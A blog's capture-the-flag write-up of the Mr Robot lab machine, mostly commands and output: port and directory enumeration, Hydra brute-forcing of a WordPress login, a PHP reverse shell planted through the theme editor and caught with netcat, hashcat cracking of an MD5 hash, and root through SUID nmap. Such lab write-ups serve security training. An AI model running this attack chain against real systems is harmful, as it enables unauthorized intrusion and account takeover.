---
layout: project
type: project
image: images/writeups/vuln/mr-robot/logo.jpeg
title: Mr Robot - Vulnhub/TryHackMe
permalink: writeups/mr-robot
# All dates must be YYYY-MM-DD format!
date: 2021-03-25
labels:
  - VulnHub
  - TryHackMe
  - Wordpress
  - Easy
summary: Based on the Mr. Robot show, can you root this box?
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/vuln/mr-robot/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = Mr Robot
OS = LINUX
DIFFICULTY = EASY
```

Note:
This VulnHub machine is also available on TryHackMe as Mr Robot CTF

## Enumeration

Starting off with rustscan to quickly enumerate open ports

```console
┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# rustscan -a 192.168.229.162 -b 1000 | tee rustscan
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 192.168.229.162:80
Open 192.168.229.162:443
```

Enumerating the open ports further with nmap with aggressive scan

```console
┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# nmap -T4 -A -oN nmap -p 80,443 192.168.229.162
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 19:37 WAT
Nmap scan report for 192.168.229.162
Host is up (0.0010s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   0.25 ms Toyin.mshome.net (172.20.240.1)
2   1.26 ms 192.168.229.162

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.59 seconds
``` 

using curl to quickly enumerate, I found some files in the robots.txt file
Key 1 of 3 was there and I got what seemed to be a custom wordlist

```console
┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# curl http://192.168.229.162/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Running a gobuster scan I found some directories which let me know the site is a wordpress site.
My nikto scan also gave the needed information

```console
┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# gobuster dir -u http://192.168.229.162 -w /opt/wordlists/directory-list-2.3-medium.txt -o gobuster-common -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.229.162
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/03/24 20:35:06 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 238] [--> http://192.168.229.162/images/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.229.162/]
/index.html           (Status: 200) [Size: 1186]
/blog                 (Status: 301) [Size: 236] [--> http://192.168.229.162/blog/]
/sitemap              (Status: 200) [Size: 0]
/rss                  (Status: 301) [Size: 0] [--> http://192.168.229.162/feed/]
/login                (Status: 302) [Size: 0] [--> http://192.168.229.162/wp-login.php]
/feed                 (Status: 301) [Size: 0] [--> http://192.168.229.162/feed/]
/0                    (Status: 301) [Size: 0] [--> http://192.168.229.162/0/]
/video                (Status: 301) [Size: 237] [--> http://192.168.229.162/video/]
/image                (Status: 301) [Size: 0] [--> http://192.168.229.162/image/]
/atom                 (Status: 301) [Size: 0] [--> http://192.168.229.162/feed/atom/]
/wp-content           (Status: 301) [Size: 242] [--> http://192.168.229.162/wp-content/]
/admin                (Status: 301) [Size: 237] [--> http://192.168.229.162/admin/]
/audio                (Status: 301) [Size: 237] [--> http://192.168.229.162/audio/]
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2761]
/wp-login.php         (Status: 200) [Size: 2761]
/css                  (Status: 301) [Size: 235] [--> http://192.168.229.162/css/]
/rss2                 (Status: 301) [Size: 0] [--> http://192.168.229.162/feed/]
/license.txt          (Status: 200) [Size: 19930]
/license              (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 243] [--> http://192.168.229.162/wp-includes/]
/js                   (Status: 301) [Size: 234] [--> http://192.168.229.162/js/]
/wp-register.php      (Status: 301) [Size: 0] [--> http://192.168.229.162/wp-login.php?action=register]
/Image                (Status: 301) [Size: 0] [--> http://192.168.229.162/Image/]
/wp-rss2.php          (Status: 301) [Size: 0] [--> http://192.168.229.162/feed/]
/rdf                  (Status: 301) [Size: 0] [--> http://192.168.229.162/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://192.168.229.162/]
/readme               (Status: 200) [Size: 7334]
/readme.html          (Status: 200) [Size: 7334]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://192.168.229.162/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://192.168.229.162/]
/wp-admin             (Status: 301) [Size: 240] [--> http://192.168.229.162/wp-admin/]
/phpmyadmin           (Status: 403) [Size: 94]
/0000                 (Status: 301) [Size: 0] [--> http://192.168.229.162/0000/]
...snip...

┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# nikto -h 192.168.229.162 | tee nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.229.162
+ Target Hostname:    192.168.229.162
+ Target Port:        80
+ Start Time:         2021-03-24 19:45:33 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://192.168.229.162/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /wordpresswp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ /wordpresswp-login.php: Wordpress login found
+ 7918 requests: 3 error(s) and 18 item(s) reported on remote host
+ End Time:           2021-03-24 21:01:32 (GMT1) (4559 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Going to the site I get a pretty well done page
<img class="ui image" src="{{ site.baseurl }}/images/writeups/vuln/mr-robot/1.png">

Going to the wp-login page I try logging in with admin:admin and in typical wordpress fashion it gave me a useful response of “invalid user”. I then had the thought to try bruteforcing it with hydra using the wordlist I got from the site
When trying to bruteforce the password it was taking forever then I used sort to remove repeated entries and that really reduced the number of possible passwords

<img class="ui image" src="{{ site.baseurl }}/images/writeups/vuln/mr-robot/2.png">

```console
┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# hydra -L ./fsocity.dic -p password 192.168.229.162 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.229.162%2Fwp-admin%2F&testcookie=1:Invalid username" | tee hydra-user
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-24 21:33:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://192.168.229.162:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.229.162%2Fwp-admin%2F&testcookie=1:Invalid username
[80][http-post-form] host: 192.168.229.162   login: Elliot   password: password

┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# hydra -l Elliot -P ./fsocity.dic.sort 192.168.229.162 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username" | tee hydra-password
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-25 13:28:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.229.162:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered for the username
[STATUS] 1583.00 tries/min, 1583 tries in 00:01h, 9869 to do in 00:07h, 16 active
[STATUS] 1566.00 tries/min, 4698 tries in 00:03h, 6754 to do in 00:05h, 16 active
[80][http-post-form] host: 192.168.229.162   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-25 13:31:56
```

## Exploitation

After signing in as Elliot I get admin access to the wordpress site. I used Appearance->Editor->404.php to get a reverse shell by replacing the contents of the page with a php reverse shell
After starting a reverse shell and going to an invalid page using curl I got a reverse shell

<img class="ui image" src="{{ site.baseurl }}/images/writeups/vuln/mr-robot/3.png">


```console
┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# curl http://192.168.229.162/shell

┌──(root💀Toyin)-[~/infosec/lab/mr-robot]
└─# nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 172.28.144.1 32484
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 12:48:02 up  1:12,  0 users,  load average: 0.00, 0.20, 1.76
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ python3 -c "import pty; pty.spawn('/bin/bash')"
daemon@linux:/$
```

I found the user “robot”. Going to the home directory I found 2 files, key 2 and a password file

```console
daemon@linux:/home/robot$ ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Sending the hash to my windows machine for cracking with hashcat. It doesn't take long and I get the password for the user robot
I then changed to the user to be able to read the next key

```powershell
PS D:\hashcat> ./hashcat -a 0 -m 0 .\hashes\robot.txt .\wordlists\custom-uniq.txt
hashcat (v6.1.0) starting...

OpenCL API (OpenCL 1.2 CUDA 11.2.152) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: GeForce GTX 1050, 1600/2048 MB (512 MB allocatable), 5MCU

OpenCL API (OpenCL 2.1 ) - Platform #2 [Intel(R) Corporation]
=============================================================
* Device #2: Intel(R) HD Graphics 630, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 151 MB

Dictionary cache hit:
* Filename..: .\wordlists\custom-uniq.txt
* Passwords.: 23660834
* Bytes.....: 229781965
* Keyspace..: 23660834

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Thu Mar 25 13:58:12 2021 (1 sec)
Time.Estimated...: Thu Mar 25 13:58:13 2021 (0 secs)
Guess.Base.......: File (.\wordlists\custom-uniq.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7797.1 kH/s (4.91ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5898240/23660834 (24.93%)
Rejected.........: 0/5898240 (0.00%)
Restore.Point....: 5570560/23660834 (23.54%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 9952186837 -> adnankananovic
Hardware.Mon.#1..: Temp: 45c Util: 37% Core:1354MHz Mem:3504MHz Bus:16

Started: Thu Mar 25 13:58:11 2021
Stopped: Thu Mar 25 13:58:13 2021
```

```console
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```

## Privilege Escalation

Doing some initial enumeration I checked for SUID set binaries and found that nmap had it set. Nmap has a listing on gtfobins for privilege escalation using the set SUID bit so getting root was a breeze

```console
robot@linux:~$ sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

<img class="ui image" src="{{ site.baseurl }}/images/writeups/vuln/mr-robot/4.png">

```console
robot@linux:~$ nmap --version
nmap --version

nmap version 3.81 ( http://www.insecure.org/nmap/ )
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# whoami
root
``` 

pwned
